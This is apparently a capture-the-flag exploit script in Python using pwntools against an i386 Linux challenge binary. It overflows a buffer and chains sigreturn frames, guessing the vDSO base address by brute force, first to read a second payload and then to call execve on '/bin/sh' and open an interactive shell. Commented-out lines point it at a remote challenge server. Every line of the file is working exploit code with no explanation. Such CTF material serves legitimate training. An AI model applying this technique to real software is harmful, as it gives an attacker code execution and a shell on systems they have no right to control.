#!/usr/bin/python3
# -*- coding:utf-8 -*-

from pwn import *
import random

context(arch='i386', os='linux')

# context.log_level = 'debug'
elf = ELF("./chall1")

vdso = ELF("./vdso")

int_0x80 = 0x08049017

# sigreturn frame
frame = SigreturnFrame(kernel='i386')
frame.eax = constants.SYS_read
frame.ebx = 0
frame.ecx = 0x804a010
frame.edx = 4096
frame.eip = int_0x80
frame.esp = 0x804a010

frame.cs = 35
frame.ss = 43
frame.ds = 43
frame.es = 43
frame.gs = 0
frame.fs = 0

frame2 = SigreturnFrame(kernel='i386')
frame2.eax = constants.SYS_execve
frame2.ebx = 0x804a304
frame2.ecx = 0
frame2.edx = 0
frame2.eip = int_0x80

frame2.cs = 35
frame2.ss = 43
frame2.ds = 43
frame2.es = 43
frame2.gs = 0
frame2.fs = 0

RANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)
print(type(RANGE_VDSO))
while(1):
    io = process("./chall1")
    #io = remote("0", 4444)
    #io = remote('chall.w1playground.com', 44827)
    vdso_addr = random.choice(RANGE_VDSO)
    print(hex(vdso.symbols['__kernel_rt_sigreturn']))
    
    frame.eip = vdso_addr + vdso.symbols['__kernel_vsyscall']
    payload = b'a'*128 + \
            p32(vdso_addr + vdso.symbols['__kernel_rt_sigreturn']) + \
            b'c'*40*4 + bytes(frame) 
        
    # gdb.attach(io)
    # pause()
    io.send(payload)
    sleep(0.1)
    
    pl = p32(vdso_addr + vdso.symbols['__kernel_rt_sigreturn']) + \
            b'c'*40*4 + bytes(frame2)
            
    print(len(pl))
    pl += pl.ljust(0x200, b'\0')
    pl += b'/bin/sh\0'
    io.send(pl)
    sleep(0.2)
    try:
        io.sendline(b'ls')
    except: 
        pass
    recv = ""
    try:
        recv = io.recv()
    except:
        io.close()
        continue
    if (len(recv)!=0): 
        io.interactive()
        exit(1)
    else: io.close()